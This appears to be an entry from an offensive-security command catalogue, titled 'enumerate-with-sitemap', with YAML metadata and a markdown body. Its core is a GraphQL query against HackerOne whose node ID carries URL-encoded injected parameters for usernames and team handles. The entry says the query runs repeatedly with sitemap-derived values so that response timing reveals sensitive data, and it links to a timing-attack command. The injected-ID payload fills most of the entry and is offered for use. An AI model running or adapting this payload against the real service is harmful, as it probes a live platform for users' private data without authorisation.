---
data: >-
  query { node(id:
  "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3d[username]%26core_team_handle%3d[handle]%26")
  { ... on User { id } } }
tags:
  - enumeration
  - sitemap
type: command
output: Timing patterns revealing counts and prefs
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.592Z'
id: 0e1f53a9-e6f2-4181-8f88-2284724c664a
verified: false
validated: true
submitted: true
---
# enumerate-with-sitemap

## Command

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3d[username]%26core_team_handle%3d[handle]%26") { ... on User { id } } }
```

## Description

Iterates sitemap-derived params in timing queries to enumerate sensitive data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Templated injected ID | Yes |
| [username] | From sitemap | Yes |
| [handle] | From sitemap | Yes |

## Examples

### Basic Usage

Replace placeholders with actual values.

## Expected Output

Inferred data from aggregated timings.

## Related

- [[commands/perform-timing-attack]]
- [[procedures/Enumerate-Sensitive-Data-using-Sitemap]]
